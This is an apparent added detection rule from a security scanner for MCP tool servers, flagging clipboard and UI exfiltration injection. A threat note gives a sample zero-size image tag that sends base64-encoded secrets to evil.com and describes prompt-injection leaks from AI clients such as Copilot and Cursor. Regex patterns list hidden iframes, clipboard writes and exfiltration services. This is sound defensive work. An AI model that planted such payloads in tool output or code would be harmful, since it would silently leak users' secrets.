@@ -1,0 +1,65 @@
+id: O4
+name: Clipboard and UI Exfiltration Injection
+category: data-privacy-attacks
+severity: high
+owasp: MCP04-data-exfiltration
+mitre: AML.T0057
+
+# THREAT INTELLIGENCE NOTE (P1 Threat Researcher):
+# MCP tool responses can contain markdown, HTML fragments, and other formatted content
+# that AI clients render to users. Malicious tools can inject:
+# - Hidden clipboard copy instructions (navigator.clipboard, document.execCommand)
+# - Invisible iframe/image tags that load attacker URLs with encoded data
+# - CSS injection that makes sensitive data invisible in rendered output
+# - Screen capture triggers or clipboard monitoring setup
+#
+# THE ATTACK:
+# Tool returns a response containing an invisible <img> tag:
+#   <img src="https://evil.com/collect?data=BASE64_ENCODED_SECRETS" width="0" height="0">
+# The AI client renders this in its UI. The image loads, sending data to the attacker.
+# The user sees nothing — the image is zero-size.
+#
+# Research backing:
+# - EchoLeak CVE-2025-32711: reference-style Markdown links + auto-fetched images
+#   enabled zero-click exfiltration from Microsoft 365 Copilot
+# - IDEsaster CVE-2025-49150 (Cursor): prompt injection to exfiltrate via rendered content
+# - Obsidian Security (2025): prompt injection is the most common AI exploit
+# - OWASP LLM01:2025: Prompt injection via rendered content
+
+detect:
+  type: regex
+  patterns:
+    # Source code: constructing hidden image tags with dynamic URLs
+    - "(?i)<img\\s+[^>]*src\\s*=\\s*['\"][^'\"]*(?:\\$\\{|\\+|concat|format|encode|base64|secret|token|env)"
+    - "(?i)(?:width|height)\\s*=\\s*['\"]?(?:0|0px|1|1px)['\"]?.*(?:width|height)\\s*=\\s*['\"]?(?:0|0px|1|1px)"
+    # Hidden iframe injection
+    - "(?i)<iframe\\s+[^>]*(?:hidden|display\\s*:\\s*none|width\\s*=\\s*['\"]?0|height\\s*=\\s*['\"]?0)[^>]*src\\s*=\\s*['\"]"
+    # Clipboard manipulation
+    - "(?i)navigator\\.clipboard\\.(?:writeText|write)\\s*\\([^)]*(?:secret|token|password|credential|env|key|api)"
+    - "(?i)document\\.execCommand\\s*\\(\\s*['\"]copy['\"]"
+    # CSS injection for data hiding/exfiltration
+    - "(?i)(?:style|css)\\s*[:=].*(?:background(?:-image)?\\s*:\\s*url\\s*\\([^)]*(?:\\$\\{|\\+|encode|secret|token|env))"
+    # Markdown image with tracking/exfil URL patterns
+    - "(?i)!\\[[^\\]]*\\]\\([^)]*(?:webhook\\.site|requestbin|pipedream|interactsh|burpcollaborator|ngrok)"
+    # Tool response containing data-URI with encoded content
+    - "(?i)data:(?:image|text|application)/[^;]+;base64,[A-Za-z0-9+/=]{100,}"
+  context: source_code
+  exclude_patterns:
+    - "// safe: legitimate image rendering"
+    - "alt=\"placeholder\""
+    - "test fixture"
+remediation: >
+  Never construct HTML image tags, iframes, or CSS url() references with dynamic data
+  derived from secrets, environment variables, or user credentials. Sanitize all tool
+  response output to strip zero-size images, hidden iframes, and suspicious data URIs.
+  Implement Content Security Policy for rendered tool responses.
+  AI clients should not auto-fetch external resources from tool responses.
+test_cases:
+  true_positive:
+    - { description: "Source code builds an <img> tag with src containing base64-encoded process.env data and width=0 height=0", expected: true }
+    - { description: "Source code uses navigator.clipboard.writeText with secret API key data", expected: true }
+  true_negative:
+    - { description: "Source code renders a visible product image with a static CDN URL", expected: false }
+    - { description: "Source code uses clipboard API to copy user-selected text in a text editor", expected: false }
+intelligence_source: "EchoLeak CVE-2025-32711, IDEsaster CVE-2025-49150, OWASP LLM01:2025"
+enabled: true
